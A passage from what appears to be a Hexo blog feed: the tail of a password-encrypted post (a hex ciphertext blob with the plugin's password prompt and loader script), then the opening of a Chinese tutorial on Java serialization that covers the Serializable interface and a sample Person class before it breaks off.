d0d7a9c21e28736c155d94ed21a3d02866d2d941119dfea915aec40890487317f72584be8e8ced77a05aa9ab4c053aff5930e49867bfca5128743785ddcb9a8679330240b264fa649c7c04f935ed9671eeb2fffa541f5110fffe7a5cb2c2a05dda7053f404374dbb75f94dd20650f04926052b5be2fa172cd9594e89f09832cf60ab82607f4fe5ac1e362c891ed9c36d2f3a8c9c4ab66109f62658a841cf2aaee6ed583e5875b990f868ec7df23d219666cf11589ed634605f964950ce7181f182c5e01bc36569d85e3de28d15e1c0368d4869c0461e512d3b0fcfe2cec65c4ca762c538582ec6c31c247c55cd9e373c0c33255c333f657e34ff4da6685e6a12ea6080c409e906e26d8dae5cb9de61ab9a2ac0d9d5932adbd342adf346c1d04dfa497ea1d87ba567c0b4e30974ecd7e4eb256d941e1b64e849c8e30fb20610fcc9f0987f65959ef2ea62167143e9b7a436f18838370aca4c4cc125298e5552fc045476653bbe60aaf09556a7d262c2413e67cbab1d6cebcb7ce9f16ae571b62d4d056d6fcc4c2a2123bf1b3f952bad9a2a29d7fafb8a3b14a9c991a3bdf3754b8fe1e5d22938a63ffbc475c1ba7019504bd62bda336bb72d0512cc99477264f7bb8125b4f44583520088cab0d6a2237ca4402a52b2f4b6466efd68c52b16b0b0d2e92588380415e02aabe51dd283142091d1824cb8739fda058fd4b78f1230c85d23a1c04031884186ff3df2f7f54ca703070fd765f4212d54de23a455fe5791f610c6eb50585bae08dac7e3bd4a49c41609c74fd1b1a0ee293a39242418180f36d1b99f6be5c88714526714b0556f7f2beafcb86b7d1e30241310e76ac5b7981a5dd54cb7a7da99f569df9e991da76607029e673d6bef2585743ce2df245706fcfec62c4266f242adb50f0dc82d5430b27f739588685de309b6c2ac2a0e11f81519f87c43bf61e3dde547877baa768812d580a2cb2986b380e5a0409d5846a4bb678d90d7c064209e5871577174085744ba8bac68476346fa71501d80b268352bc5a70ed35a31c32255c13605263df6a44e22b885e934bdae66793ea1e8a3682c9dc54bfb0990496d85ff34775b07429394c50526be414b3016518f1f0cf4a37de4796b9895c95f3729209663b0a333031eda14410b4cc7970b143f67310c36de7aa59f9eb58d5f1762c0dc8ba61eaab34bfda0bdae0db4b72b144c2750ab53fd69215a6cd1bed9e2fc8b130606cdd4303a7d90ad10d908bfa4267da7e3b99072559799fd3422581f7782fe510dad3a9f62b3a6262644495011b57c36f7f6f979f0644ec68e3ea4efb3029f7a5fa4e09241e5c5f8c1b34858a982c2d1486744b4163fd16a67576d8198758c03d2c5d715a3a7a6825e6638c6ecc31b53e4259a83a2b4d77335f5ed10a7f8f7a037c3f1629afbdd9cdb26f227ad907c1ec9b815b6e43b86a473f4a407197935b31b395ee10a2e17e524f142f00d7cbc332fdbe08b8347290d912593db4eb7caced2a64ff9eb25ea3a424afcd5978c63683aecf3ec39c633ced574a1f93000cb1bde9d9d67e90cbb8b8029e5fa4ece92c0935498e2237380957019dffed814412d837d757c587b58e69fd95af064d1060f32bceffb86d6f252a754e57b004acd064baf96f6ff551cde1e039f3d3773b681ca84ff35d9d3d1ca00dd9d02f7b552c35a555044e2634b4bb3a9676b156898d86b1152b123a74dd0f690f7fe734338514349b58cf71ad541e988ec3a68b373c022582e63b1f5c5618917c07d4c8a11e586b9c6560ad299442586dcc43858ada7c5b0599697dd680e072342a241b62c92416e69e608be9277f935022320cb03061e32ecf6aa5b78a9810507ad47242083decb0eaa4409768d64507487f6e9d0d399a83909d502c166f682c07c22f672858f933c239197579d4f910acf11717d0ab7011acaceaa2f21ba635f9fab755ddeb53635ff12f5205bb893f2fb4b005f0ab65ff71a3aa42c59d328b001dd52ff49d637b5cdf4557f3e2cd7066cfef84c5cac5b93fdcf7547d367bdbe0ea7323f1e7e1d0732965e1c01834dc53dc696e50cbf575e0aeebad59eef110d96eefd56fa032502a64cbc41369fbb9177fd9ab3328ca164d9e5d37bc67964f5b0ced17b2340cb88e5bf8a0f9ec3d7b96c28c9d06482b5cde8491a90748e22421ff671da106144963cdc84ca342c4ccf07540bff61c76fbad41bcbae592530d5c75144488fa9f902d8b109b78409bcac6e27bb672970e7e442699cd943bb3e04c0fe51bf64010dfe9f2d68ec986898ed2cb88312298227513cbe975be2f60e09ccb90fdd7c60ed07d562674f4b029392f0d12291e97797faf6e0dd68ddf0b303cf5da74d2c3533699fced253c494bea7150120087741373a61ecf6676d71eeb8eb14fb7978e1eda8fe21825b01b892f8820b5f90f3a483fe2ad417c3429af78c25508ac8ef5e80c36f2a131eaff68a165c2ed54a5b0f48398268321a16882e696040ba18e90259227b22ec35bc65b922103ce6bafc1362daff3545e6db60c7016a22ff81f78a235ebb1034cb1289994f2b2ad998c91d4b6d5058518b39782cfd3f15a961f8da584175ebe1079b94b838b8e710f50df9b6dbb85591bc44f46cd6cd5e925b4668c66d55ef55cfb14c599eb75237efc0b385afba5d3ba804287eb5c11a74b2211677adad8df7d47030c1bed97e7b34fdb89e5ad6d1c583b29b3e2ecf1cbd861b43d3743b3dfa6e5fa1551344e67e6fab6eb9e439ecf9cf67ea7de61564a5897bfae3760f802356720b42529c7e4e9c074caa33089bd2f496dca3f53c7ac49505721862129291fbf54082bd6a569bb25324cfca4964c3c3167ba5a16b072b674a9b076f1569498881dbbb2b7a6e221510ac5cba9175f1bfc459dfc3df82de3314bd89753c791704de09a31d15097899168cb9261824dcc71ee6b77740b70555f907abeeefe153f8187cdcd7c8f0f983dcd92cf90f9c1c02e2d6f9808ec54f2540af80ea8d6c7ef564ef18cb9b35735ddf9e12825610bb29241579b6823b811b285e71bb961d13026f5eddd939cf94184be63305937cea52f99d9a38ece98cfa49fdfbfbf51eb199833bc46f290fd923001eb3d2b8f787d8f450790b6260c193c158d6154aa9b037b4f60c25e7273cb8b6e0b888116fa1d3480344b715fb89f549f816f660579f5febb2b49877445d8c9fb5aa545a100725d0e36d3d5f8e4f4009c473c3b28cfb8a27730406f2b5f057b39d204f1584b4d1f902139168e868b1aa2f9ee202db262b6d462b29c663e9f6aff78e4226e3e04fb09f45edbcbefb5b9bec7035b3062577432faf485b4644d44f550786a7fb160ea791bc894bc0b5ac0acc8c97003760d38ce06247fcf9fc2e09077a5a1cbc4533272c05c8b0c4086c46996134dffad850fe152f86865d46ce73144af4838799eb0f5d942437c56ab18347947b02e436f008e291d4bc6c3cc56a4c10527ac26a2ac50b4f09dd23ef49a63c399563fe43df8b27d1cbc9a655873450a50d1f023b7981f99509e43670c69a06ad7e7b30417c4ea509511689baace831946fcb3136d87fb6059e0c86bd0cfda4ab846fc388ce9d48680857199a38e0f152c452917eb66b18cf7ae009de4bbe594462f05c53a40d364fdf2d474698e1d682d3bfa2716105bc47c71a5b7a37c9fb63f0365dd9470b0b4dfd8d77183dd10f67cec6f3c5802659fbfc6a25cd5ac77f3d66a9d32843eff1cdf296214f62941bb7f518056312b24fb08a7e511b49b8caf579630f5696d2a571f4e31eba52647654cbd9f0dba17a19b368fbb26c936ac49da11dc97f030b1449812cfee0d2716456b08acc97212fccb813e28b418677ae488a4e9843b0ef28cde914812fcbe208123ffbcf4e16cac57c2bfa2ec64a6f0330449e41ad82c4f1cefb813a16496bf68d8db806dc303b030aac7a8a9864e66f3cf3c0431f7e952abb47567493063d654c05bdae5dd3cdc02e27fd45cecf92cbf899694386bb7d4c1965eea8b80d6e54c793db7cb9904db4a936d504f6b7ab16a905562c896f33f8e1601211296fe54925e725a906f8f83b390d539d4b2b6826d1a8a85f6a9e773832a38723a9a25bfed5e708ee0777b1c01bd43144850e29adddf6508acb23522bc66e4c8c66c645ac1c1ee13435e002b49b3a56d0527d36e328bc18f40a2cdd38d114abadb500851b846327429e0e53b61cd1bed3d0c542b422a15c257065ca17ee4da27334eea1722be1a5646a83a98b8035ec78055ffdf12dd5f9b0477b543a3a454af5411fd2a2cf32191dfafdb801aa9e44736e69f622ad6fd7bd5730772780f48c0a93bf78b6a0cb6bb6ad0fb7f87b5b82b28ddc7e73ea3cd1a981791b20769a840c94cb5d43df0e2ac3d66dfb44bbc4266aa6c0d8252906b7c61ce3035e04aa6bf9e59c15615f1e44724b075c5f17be76cb7f4f41b48c3f604c1915b6ded9460485a233e2c385d3b8631b631f56da0f7805cf9531978dc01168a4439377c306ef1f9fcf84649b7bc5bb3bb8191e5f92a0850ad9241ff36bffaf8577b0f1723d0105ac60369973c72e700df3cdaf0fd687fb007c5d3a07aecc3b7196dcb9fdafd734eb422bb6a565f8da76e64561627041439a5fae5f1586511824142bcc62b04def429cebf6a04a125b0090aa8c1bcaaff6465c2ef9ff5bca87f5815b088ea8d2b27a5c52aa9bedd6390bba0c56ab19dfa6b5991b6981268cb7330c8aecdf5c379d43035d2ad33f2e94ee80a30dd6aab42a845a21808dfec2413c0da167e2b04d8c55f6859efadff25ae90f8ef1fdb2d018bb2d31c20362b69ddf2e955db0c7ec55bcfc393439c8bc9f8b18a90525b40a2739fef7842b174915ad5adb5b7a2c027eefb6b34e8da8270f7f6d26a167e6df9e11a36e31e130d33a9a69b7279e4ac3ae326ae400f1d58ebf6fa1b6abbfae4484a64c035e4553419884ba3654badd2edb9e268723ff12517fdb33bf10b6e455931b46f646a0c46ef5e010b7593859f40ee16efc87f5c62b6fd49ace2f1c280b5f37068f994a664dfa3ad713a43214464ef938cb1270e2f9d58e770ae0d03a87712da863669f8ecf51559da671f51c18e961a353146818ab3728239b516f36db7599a0d0044671cc67168cc75e738823f9d84fae8a0deb9d06b88d4a12506a6575333cfb7157ffc62c6a6d0e65eafb5820aaa3cac8104f1ff552cf588ca58ee878e5fe9545697c60b1e4ef7e7af0be63896e4376262e15ccb8b9073c5e35bc3c342e81841f50f42d3fb8286f4cb302a670fbe1b67b4fd0c0c2692da41ff141654802c8d4ea2e987d7dbc34b03cb535b6cd5e336bf001528f3a49cf88980a6f1ad7db81573e41b81973ef792484f83b4c158443f970206c21dc032884eef21edad7ac42f02ff94bcfaf7a6956feed8361125b1de518f6ec43b1f3ac9832acd8f2d170cee9f1babb2580bf9bd5d1aef44917294e966cddb7e5c64243f1fed29405775b9c7964e5fd50bc6ef91cd860bc7e38087d1a25a3370f877f9c13e3e94c3fabd15805d8e9d8591ae8c4fb418dd8d61c3dffd9ea2a14b837557c019960e409578103dc399e1541b8cd30580d514aaf1f9c2e91455be364a86ae299384fbb354fa2d55ef250ff22bb6bfdba9bd90b4f9d2be3a708e0034f8b4b112ce8aa287beb721dfc57a62bf4d60bb90b290a7e6adbee6950898d50cc4fdf53212529c3ab473896ca7a20c9ee1d2d4e055fc9b3b8c80ae180e1d4ec6a16ef129cc69d12974dc000db5f6677d7a80f26a1a65b01381b0d7c0345f68d4dd4b28790b7b66067ffd40d751eb3b62b11b52d025e3b2b72d9552371f675c7631b5c8cb7035820f4bb2ad6039e42be1b06642ec5954e022c1fd782905d4f43b35b5757abef9bc767e81880031358e23d4dad4df87c481c59c9d9bc78118b1b6f2ef6aac7134bef39c8e08f05cff793a97d2e8a267b673748ec72c2f75b8ba024ac973b8194eb7e476d34a20af8d346a8631c31215b950fdccc969682aff41b8c4019e9df7e1c33d51b103df714b8eae70d3f52790a70daf480c1e63108106512665f78d868c875ec1401804937022a906d5ad247cf659a76290dfae7290402ab6037bbf2528fd5ac1f1ba9e2f85e50fcd0eacfbd599c7ff93c16bdad3a98a347a60e559cad2bb4acdb6fe78a5e78470250024fb3e4d32365313675f412e3071723c28b15f1ac0be08d4bdb962db46afcef71cd2392d040b1ede11516cf1b0fe9c3da0d04abd991fd6f12e2ba17e57d50d041604e36a1880d36ef637fe5fd20a26d85ecdd4b0e0f0ff6f456755827f3797b339f96ba148fac931fc08c09ae6e4533a236ee3cc68582611ac628e2f5f16c4f1e75d7a145ea1c3e585d094f2fddd07548e7751636107765b0020369d3271ae40b588e47f9a31d9a63ed8a6ec59d4e4d33d2be2e730e9635421e325181f01c5c3b6317020960780e848ec7f2712e0962d73ed8422f415458a7ae7831e102a8aac9be5ffa406bf21b5c7d494ec182ce3cfe7a0da3054c73272b429ab7c1940fedbd4587408c94c29d24e254580bdb564152dcbf846aa1f3e2d63d28696b2028d632143cc7eba6657eece169ec354a6aa4817f6d3a11db2010b9caeb37cae86e4c21bebe7b2fc137878cf48ed16d153177adbef8ae97d7515ae47cb9251c9e67bf6d169b814ecc200c7ec61b059a4f4faa4e9dd469998bcdbf909152763c32a8605c505081d0492fd5cb0774639402bd4c29becba44942372188737f7058dc55c8fe1dc104f191d76204870d31fc583e96e594a921abe6995033fb2768fb16f7fad66311205bfa8c4898abddae237865df27c69018c7b5ba78a69f13c7a23ce5a0a2a827ed0f38b66bf4590956be5da416dd9f5cf96cb215d73190d96322422ff04cac4000d4c0dcdd70babb7dad68c34d17ddcf6f02c93abc23ae9a79c306cb40a7b640874cac5df5c9625dffc479a3e6851211369ae771ac5e2cc100c8e2afecafb8248cf57e898ff7ac3b304ef6a9c943f49ea20885932271819fa0a874f6f50eac989612250223637279b9af2a14bb95b4dc8e89d226c70e6cfc6cb775a268871040195ff0ca275170634d6f1f1f9a0991ae37c5b2ddd477ae8d447c2d32883d43430adb4948abc549cb75fb33b686871e8012dad051e558ec073e5153695b9ba6e015ba6a8ea28ebfa0b788daa9648c6ceaca34d272ca86c5edd2410ea476fb9a379c2467e169f35ff5bc825dc1574a94cf657d75050f3622be756c03be56cd998f948a44c8d82df6d8d9811bcde71d22955c9b50d6e3f8388fe409f03647f39dbef55db069481f3a112b5b328ace22e9adf52781de9bf77adc0965ba11fcb1f86f2be55981a4d5619739c96574123b3ec6995af59f55f98744d755190c662d05bd992d7398ba9f92e9ebc6af29a5f87db370962485eb60e055bfa7231de46c78192f6d3f944877e552aec178c61696154fabba4b15d2c27a97321e762f3deeb285bd1e14c46e563cfa530dfe3f40679933b15b387b37a50f60a548b5faebe4d6231ef4b4f21cb99705157d404848a6138cfbdfc7950fdd0bb9a8c5ef26b5d52cfb9949a17ebf8ee87f6a660c9d02092f94c13c4f8640832f96c0182d3aa593debd334f55d57039dc0486fd8a7cf77617ebb7b199972bd739892a679847e79d03de5fcbdaf0c4ab1773980c12b7e90fb302a38c4c22329fc6de55b7501feb32e080f8a3d8e2e3dbb0e0a56d2f04fa2f8a4908833577aeac5bc0dd7212eef74f6912f58b230486fe6470a59825afc95a872b42c7a51246515160230aa8ce0eb6247265fd07cbc0d6209d52590f01a81e755fc20de3a3e4e88c19d3f0c8e2ed5649c06dee3cac8b2b29bfff213d3aa2ba66b5040cb59d53af06c63ebed1d48639bd16496bed6750e037f705cd1e7ac75627a48767778fa2ab9ff435ef34cbe9d1df7e5cedde05ce5c712e9e89d8e8999451eed6b7a4525c258ad7541128f4e93681a02d61b4a047299885d45e448b0da22a59438dafa5646d12b464757c2a60426dadb7ab1f3fee54648c053fe6fc2e9f3d7158651557850e897e87b01231d9841e2974231f5490d295cffd43480b536e6253c247c0b305c15f95b69eabf337b0e857c20131673a6bb485b0754c8653884f7878c6a719c529859c6a73e0efcdfdc2400e4b164e4d283d4aa1fcde785c93717a11c0a54b5800fab84b0904ec607d801697bbc28e8cbdd66eb3feeeab40b4710249b7f24c975771f05efc31bcd426335fd542c98d49bf4ef59247878a1042c8034c4f36f24d6cacf6353532db41d711a25c7c31fe1ac9de0c016a1284cdbb23b909c03c2ddfe3c787233685d90274f4af8dc5480b5fc8f0d9270906a621ae68c087fbc254ac6b9157e43a84e17344c01c391183fde05d05810a79eddf06b748a1cf015e6c20ec57c6a6b569568b7a28558e994a146db718a072685ec8c8685e7e40ad40130e0c9d2b5b3a88cf1a6717fade5671b6be90d18ebb2442972954d84df3c38e79a7260efaf70dfa72d05a901a091309c4ea263a815f488ffb3657cab1a6a972b2c777130fc34ef3169ef11ce31d2b1c951efd3c3a79508387b38d57e59559004a06c3b194d12565cf1e61aa7da6905789b3d8130a7c6c1fc7f586a1256cacdb5ec155993063a232b553734eca27e0c929c4cf1902630b67970267ba476a40bc09db891e18d2173dbf313d24e11fd0cc6f2c894435d3b3a9ca7d894ee4922003190399b753670414a8ed303f5e0db54ffe32e58ba78d64a0b7d5c002bc2a853232536dd70d43dc929b76e1842154fa90e358184a5b76e18dcc4dc95b24ce61b4cbc62f63bfba250c9e549292bee4785a809db73e39a1fa36c5854044de059407968a60007bbcd8f216c814b680829c8272d988f984591eb3ca291d3a537e9431835aa5ca1fed6437dd2f5c949b5b0a74a6fdac380e31f48cbb0386d4072b00716458f50d77cd49f489c2e15857154fa27052f6992803bb68eb910b33195d9fa85834b57718f4f453052202ebc2025079ce7b9b9038f6e6da73512497090c32d8b48d40b17c7a26960280e2634739245aa2534345deaa180773baff7f8cad9e533295c59bd4e7940de20bd0d1891bb17f85669dc27c41a88bbc830c3ddc24789ca9521e2f9bd237dfafd6f735b520cb5c9d1d209233702c9f8b59370ab842d19f04c6a14b4d82d7c9cb7f1debb8ea2b73fb8bdc73d548f83a7d7c418866652421d7f5106fb04ebe54a1c2a9931ef569ad74119fb1ab2b567f154f45d88be5bbd2fb04b3406321f44739671902617371390c82e9ec152a279908e5e316852e4dfdf2ec56bd7a3bf4a1a9f15f2e84a95ff17bd173f30f0f3146c5363d21c643cda83d2b5f77523d30cc53e25b1c97fb16a02142b5a4a55afcfded60436f6caaa2531c37662bbc78ee3d75a00e95598a6fc8d8897b20505f97bc14c6e337ebac713bbabb685fb2edbc6add447bd0b55eb59f78436a4869a35c2ebf2c87c3883ec690b46d5cbc99033103f54fadea68294e51f090a970ec2b1b925eed32b3572c911b769792b2f3a1f84a5ef451a45dacf619a34c5f8f9ed6622f60a659d5be3f3cd65b328d97eb5c752701f7ab3754f9a1cb8170c2c864b0b75789d6554dc8319091281812567c5abb405f466fb65c5a9bed33b7285efea1807fa183e73943ce22516eccbcb1dcc6df17dbeaa0229b1782f025ae5fe1d1583b8daad6e568c9a9462ebced295012e095b55184fb7f03b14ad57dfa1af33a8199f67b07a261d1ba468e78c116848d75974e123d33c73ef57d453795c835b4aa5604c2e70b51e8e280394bba61d543790f428d92e80e5c0b1ad5338d8957344703875e4f41c44d323388b868aedab67bf241170ee9a8ae072a6c56fee37cd06e73614e6a909a5e6249fe2985898efffdfa3699a23c7165c70359c5c560fb53f5147d8bb93f814e1a695c588d5eba4239cfbcdbfadb2f732f332e5a0a61a716dc608196d4faf611a87d3e70d17ec6ba96eca8b72fc73ecdd716d11d9f5c275ce437fcccc12f52378e70c4c18435cca352d02443002537a1a959bf1f8d11e878f1276ba662518023728be0abbb4760bab3129031ae49f08c748818eebcdf66fcbd1191514d91d091f1f426c7e856c6070e1469542096c00f9d359d9cd5b9a39733aaa7a5fe4758517205f2be8be22773fbe023e2e6d7ab942414d28cb47043e8d2c45ea2a4479a106476cbb8260edb411c7cffdfe90aa4d88d9d712ff630a63af7bbefce5c3a1743cb4b3f766f88cf6c3edae135c477607a3fb85008f413c6a4dcf0550786487f0913f8a9ca9feb2af4f53ad620fd67c12e0ee29fe42ea0736b0e359b85ca9aa0a538f0cb83a202e29e82740abe4bd9f352670c24f1b04f724f6e73af2e37a705be3be3743891f60f7bea9dd51bdeb03bb8c5d246b5573a97eeb2aec2a0514de9eeacec55460eb20690b629d2ec71048c0c7dfb5f866936901c9cb7f0d820d8a43834d8f6bae11a8faa0bb15a4689f79b20cbc189935dfbcb3984bb1648c1848dfa2ff8c5deafcdf8cb48846dd8aa5b39b4e3fb94de82c762f63806740c6995bddff6a22e6428bef33622b4e107c3ae887a27db280e9ce0c4b952e70bbbcd0595de39c62fbef508bee5401effc40b4bee6f76e0f1cb3a842893c0a4dcf94f4a2f284a11badf8d71122c8f2e10e9051cfd7fdeab757b2b3d9a17047f20161533799e49c28a5ca62a9a4ad6b2480b4ba785abfaff227722bffae5c3f9192bee7b0fef7ba576f73afe9d86a07f5b6421e3cae35d40cf4a57067c10f64c998d4c4d6a379909e8b074e5c6fdf61ce103d5cfa54e018ee16eb8ff5e2e8535019a05ff6bc881e9f05a3a35b7b7246d4d5d4fcd5a0bc77a9860b23da0beaddf6678256ade7cbdc7cf0ea40577990b19548f997b3bbd68ee63e29b17657b876542e8526fe49971817f0b384d24c1ca3b690102d5d24e34a019b3bf7bc0c485deac18976cc88166da15aca4236e70b312001cf9ba48cd0ef32159a177f52e64e5ee1f52313671083b2656685c14178d02e3abf5e339f187bf77cfd09f59767c04018b21fe472270b58c04fd566cea1af9942e638e0214d66168701006e70b926f217774deddc720917bb9aa29cbe6f2150b67a11692655e1b884607cc4e62de368971211fe1063b25998d81347e8a85d1b85dc682989920f59e32088a274e7f5e4a9c19c80e138cfd37a88fab53fdffaa8a85219ddb190aa3714a200da06b40f44b4dd03ed13b2ee0de4394a2d8f98b0362875c60e6becaa1fb4b5401831b44eeb9eefb293554c5ecc368aaad122d1bb506cb45cab3914f263359fad6aae7bb1344b95ff37442638f6c8bc655f7396f2c6b47952ac6cf63e1b9eb4487ccd8fd1ad34ad60f63419ee479289bebaaddcecbcca93021409f4fecf7a1dbc4bc7638ceba5c8c5d62796eafb622fad42ef6a475cb636e7c8f89b626763ac6fcbc7b635c3f2f5ad82c373c3ee48ba59b189ca8b07537f9569ee55fdd0dd4dbf965d9641aba2a3e7e150e1dceb9221400b188aa8fa60fd42a498bf508124cd19675f148e90eafb7e9d97738207bff28249725a98a9bcd6d4646c1eff14d127274a20f72a6756d3354fe11268bf906922c39002aa97d5e8ff029812ac67cddf2688107684c103d23c9924cd5fc19d5d186b3a8d7a90bdc2092a3b974efd055e531cc737e53671c10ee41a2fafaaed0615dfe2169e3ecbbf6f6aa22a34cebf8e2678d01ba2370cea87deb5afd2f1c0221213411101666d59413f6d2e353f41e7cf631a922a8b4d49f4776f6ff8840638cca1328a3fe035a78482bb24e44da18ac69eb9554c07d7acf33048aa27b2543f57bbca213e8532a4fdb184c79c73538b3b9ea553575dd81142af1bd7409d614a56f9f07c634a2f96f86780aed15da0c87953877ce89d421d5004b862ef9fc371b3d69550f212e78c9c819920828667cef13a82fc2af63cc9f96170d4551acf9c69ce7c6d67bad5c4b41e0594ffc096d6cbc35494865fe45904f2ac455b8db167a2330a32b5fab1f96108d72056b6be6d84713030639cf2f9ef5a0b89b566e70e3ea9f29dd2d86811bf7bdbff57f2c2f3f14a016d4b19a7502fe593d8036106e517414e7dddfdbcdbad90694f3f85e821d456bcb56f372f1821732a4413c709c384311768e08cddaf71359b309839d23379bac80ec606ff8baf4ba0094fa1cb4f89c69819fb2bcb2498c29dabfe46470b2a3e3dcee10b96cd3157743ac14d9d94f6a7bb94e9a59ea186e4c80a11b8e3695e190597beb794858f45c36393492cee826afc4602cbf549a623a8be2259b640defcc57a4968efb76f44967771613724dfe886331742ebbb2685d7242dd9825e4b362c4d96eed42811f62d6dc5e945f4ada8f74c0f4ad2083f8541150954d264788ddc8dd653e7dcc2ca3ef08f77eb08eb943302441052bf2930d03df208b944e64f6a7587624be3c9881d2a8ce03684614610d3f23797a72f0c9bf37a6486a0c13d8039d3114f331f2d3d658ac6fee90f4568f25001e55b1465d43e0b7441bcf154879fdc4c183806d0d66b371146098aa6d2012591b6bd2e522d9b9fd1972825088dd98d4de8cd643f5d0ee42faf4b1dda74ade5b259b84e15b913838e072d2f0c4bdbcad944336c20cf27a93a523953d64cc057ed16aea20159e11063112115e57a7ce54811344af592b6c22dabdf15fbe5561bf34e2a7df148ee4ddd77d842f9a9bb9654842cf11d9fa51d395e3dde9f95607e45c1fd5357fd02a6e1f5cdc60f044b2ab85fba7160fffb191292881964a3ba21b92ea27bbf26527ee1139f8712bf38fd5dbabf030ecccb59f25d74139e54bc270ac6b99eb7af42d8c0a93fae297757fef888fc64cf5a39a1382b35bed4d7779b1b8cace531d145788493845440e7631852a58ed63f1fa515d4d1d72fcfa6fcabeefa27e746b9d77591f93cf78610737e201f7138fd8a8dfbe5adaea22a732fd8de0b4f0177e5918050f4c0bb9c336fe2691b2097042e5a4d853a2ef84c09f35e3334c858d6ae59d00b1fd1a035fbebbd3bc8e927f2d169afab0a6f67085a5965ab65abcfc142a1d012b60fd2109e284e294909d07938257159d9a847f7866b157e3be60a2cbcbc458f69340bb5e2e881b8f6181160a94d7cf065f61cde5347563f663e47887c2b2a1d8a45677534249487ef74ba5917d75e217d71074d327e4f8349bf83dc649f4c36af81f80632dbd380156038449b1e022c6de181916f819f32b3c78d0e2f59f277337dd0fcbb3733ed2dc6247f505804657dc77bcf46edb605b85f0213b536d798447a4ea0bb7187c758b7d2f8340d539955ecf65d3217366815c185349d4a3b5901a4e12ea421dac6e149344795bef188a412dc366ac6f0c8e5716ef248e113b5915c2c04b8399f398f54a0ba2f5506657fe083141c0d414e8a3c9a72b12dee2846373bc4d1ebd9f5e9dd2a679b88d5255b4873a4c845f37b5d4994df20d3aeeb070f687e89ef4c36a1ab7f75cc2bd8cb3841778be985339c6d7f1e303d95610c305d829306240dd62ad147f19f99b2f0d2e70691a8a6ad7562dc7addca410856fd3e7f68537de7d866cf29b162d04c4af99ee2fcc4d81e0c59acb1dbc3cac432efc64de5727e7e029ee093d241e4c80804e0c17fac7b2d036b93720298a99d07cb7622023e0959c9138a2890707a4f9caf2aa0d9577387cd216031cc3a6624cdce4709c2a1dad4d41abc6ee0f6c77aa1cc3014d4fcc22c47c464c9faf290b00b43e02daa75ce8b7247d0ec521f057d753a5e72cf682f674da4eeb110e0bff28106f77d8aa269e10ff1e6cbf25ed10fc192768858645b88b8b5255772b457ecf3dbf575d6a9a7dd45d13e76abdac9b9798540efa1df2cb2e73b974b262b362eae1ee73bc3a1f4a3fdb171d4af04fe3d8c5b5e5b4c5432cf964e92a8eab2440a689a790fb51254fb34c3e30168bf236cb9c57d4c9bd2c66c5203ef93ba38ea9bcc07ce0ce26e7ced23b48dbc97e5b43e009b9d50fa50d4fb8bf6bf617ca9fff2d97d01bb11c20f10a871dc43d046da66309168b3917010650a310c7398e085588a65867ec42dcffb9954a14eac4549b73b0daebe2d502f25db4de03ce6a1cc6d1e408e159c49469f0947da9c8c26286ba3b223fc142280027a6fb29f28ae6a271eba1ebc6e5ea5e8e3c31ea9071740fc8e7c2f96f30e84e39deed41d7dd160ccc17610b13aa5827854dfb150cf82c2a6b107de334c44e9369389ef5829dbda08e0c9d0746a679da66c943854248942c5391b577c51e7c8e768669829bac9a8d694429c7fe942be4459f599a99948c4fd15368d797c75e88df153353a801ee9a4c72621b4cb5b0a91150b57a5ef7129d67533bd6fc766076e3e73ab25b58cc8dcbc519e1a2f23646cf01339eb38c27ab1d51a6d6a371ffcbec06108af1fef43b7d9efd2d29195e1d122ec8577497c539233956a69eaac2a006b5ede2550b725a0b54f4cb858f0c5bf993680398459fef10a55fb426143a966872e61d5a51c04aef45d1f5f2fc4d8dcb06d47b98b9d3738ae705fafd27b4fb2deb07c8ef0a141e65c3d6fcd5bd0a7c0f5570bf3e3558fa4f6be1876f3ef4f8b6bb3ee0b81d7dd651186bbf7f73f8ee32f09f9acd8b98da7cceda78a99214389934f3d3f814cab37e4da1d1b190f60bff7f47485170c1e92bd6f4882b0797868f4542ba303a794d82fa5a7f5e39cb9af07efbc667e7359bae3aea292c703b7deab40c275ccedf54b6cd60ed05ba440fb98f7095dc4464e919f5930d4de0bb6a45ffc7e1d7fdda8c74e0d8098e69ba5652cb316efcc9f5d3d1cc7e303311692d521614a9c94100fec8105dcee681387ada87c651e4d8992cb5baa1c321c29183b9e0e8a60932cf1853c7187f46248af7db28a96eafeeb8fb547a256b7352770b4a18a226962de4e9bbb799b9a132fb516014e07f9ca2165095b1063dd796ead76c8686a</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
<script data-swup-reload-script type="module">
import {initHBE} from "/js/plugins/hbe.js";
  console.log("hexo-blog-encrypt: loaded.");
    initHBE();
</script>
]]></content>
  </entry>
  <entry>
    <title>Java反序列化</title>
    <url>/2024/11/08/java-serialization/</url>
    <content><![CDATA[<h1 id="反序列化基础"><a href="#反序列化基础" class="headerlink" title="反序列化基础"></a>反序列化基础</h1><p>Java 的序列化（Serialization）和反序列化（Deserialization）是将对象的状态转换为字节流并恢复的过程。这个过程使对象可以保存到文件、通过网络传输或保存到数据库中，并在稍后恢复成对象。</p>
<ul>
<li><strong>序列化（Serialization）</strong>：将 Java 对象的状态转换为字节流的过程。这使得对象可以保存到文件、发送到其他 JVM 甚至通过网络传输。</li>
<li><strong>反序列化（Deserialization）</strong>：将字节流转换回 Java 对象的过程。这允许恢复先前序列化的对象状态。</li>
</ul>
<h2 id="序列化条件"><a href="#序列化条件" class="headerlink" title="序列化条件"></a>序列化条件</h2><p>要使 Java 对象可序列化，类必须实现 <code>java.io.Serializable</code> 接口。<strong>这个接口是一个标记接口（没有方法），它表明该类的对象可以被序列化</strong>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>; <span class="comment">// 用于版本控制</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Constructors, getters, and setters</span></span><br><span 